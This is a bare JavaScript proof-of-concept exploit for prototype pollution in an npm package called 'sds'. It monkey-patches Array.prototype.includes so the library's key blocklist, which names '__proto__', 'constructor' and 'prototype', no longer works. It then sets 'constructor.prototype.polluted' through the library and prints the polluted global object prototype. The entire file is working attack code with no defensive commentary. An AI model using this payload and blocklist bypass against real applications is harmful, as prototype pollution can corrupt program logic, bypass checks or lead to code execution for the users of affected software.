Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const root = require('sds');
obj = {};
let payload = 'constructor.prototype.polluted';
console.log({}.polluted);
root.set({}, payload, true);
console.log({}.polluted);